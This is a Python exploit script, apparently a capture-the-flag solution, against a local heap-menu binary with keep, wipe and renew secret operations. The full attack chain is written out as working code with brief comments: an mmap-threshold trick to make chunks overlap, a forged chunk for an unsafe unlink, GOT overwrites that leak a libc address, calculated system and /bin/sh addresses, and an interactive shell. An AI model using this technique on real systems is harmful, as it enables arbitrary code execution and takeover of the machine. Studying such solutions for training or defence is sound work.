import socket, struct, telnetlib

import time

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def skip_menu():
    read_until(f, 'Renew secret\n')

def keep(size, secret):
    skip_menu()
    f.write('1\n')
    read_until(f, 'Huge secret\n')
    f.write('{}\n'.format(size))
    read_until(f, 'secret: \n')

    f.write(secret + '\n')

def wipe(size): 
    skip_menu()
    f.write('2\n')
    read_until(f, 'Huge secret\n')
    f.write('{}\n'.format(size))

def renew(size, secret, trim=False): 
    skip_menu()
    f.write('3\n')
    read_until(f, 'Huge secret\n')
    f.write('{}\n'.format(size))
    read_until(f, 'secret: \n')

    if trim:
        f.write(secret + '\n')
    else:
        f.write(secret)
        time.sleep(0.1)

s, f = sock("127.0.0.1", 4088)

print '[+] Keep and wipe small secret'
keep(1, 'BBBB')
wipe(1)

# Update mmap threshold
# Freeing mmapped area lareger than the current mmap threshold will update the threshold.

# After this huge allocation will be allocated from the same top area
print '[+] Keep and wipe huge secret'
keep(3, 'CCCC')
wipe(3)

# This allocation should return the same address
# as the previous small secret.
# So make a fake chunk over here.
print '[+] Alloc huge at the same address as small'
keep(3, 'DDDD')
# wipe small (which is actually huge)
wipe(1)

# this will allocate another small on top of huge
keep(1, 'GGGG')

# alloc big after small
keep(2, 'HHHH')

print '[+] Small and big allocated'

# Now create fake chunk at big by editing huge
addr_small_p = 0x6020b0

payload = ''
payload += p64(0x0) # prev size
payload += p64(0x21) # size
payload += p64(addr_small_p - 0x18) # fd
payload += p64(addr_small_p - 0x10) # bk

# big secret from here
payload += p64(0x20) # prev_size
payload += p64(0xfb0) # size (prev not in use)
payload += 'E' * 0xfa8

# payload += p64(0x31) # size (prev in use)
# payload += 'I' * 0x28
# 
# payload += p64(0x31) # size (prev in use)

print '[+] Send payload'
renew(3, payload)

# payload += p64(0x30)
print '[+] Free big chunk'
wipe(2)

print '[+] Unlinked'

# point big secret to got
payload = ''
payload += p64(0xdeadbeaf) # pad
payload += p64(0x602018)  # addr_got_free @ big
payload += p64(0x602048) # addr_got_libc_start_main @ huge
payload += p64(0x6020a0) # small
payload += p(1) * 3

renew(1, payload)

print '[+] Table changed'

# overwrite addr got to puts plt
renew(2, p64(0x4006c0))
# call free (actually puts)
wipe(3)

print '[+] Reading'
data = read_until(f)
addr_libc_start_main = u64(data[:6].ljust(8, '\0'))

# calc libc base
addr_libc = addr_libc_start_main - 0x20740
addr_system = addr_libc + 0x45390
addr_binsh = addr_libc +  0x18cd57
print '[+] addr_libc = {}'.format(hex(addr_libc))

payload = ''
payload += p64(0x602018) # got free
payload += p64(addr_binsh)
payload += p64(addr_binsh)
payload += p(1) * 3

print '[+] send /bin/sh'
renew(1, payload)
renew(2, p64(addr_system))

wipe(1)


shell(s)
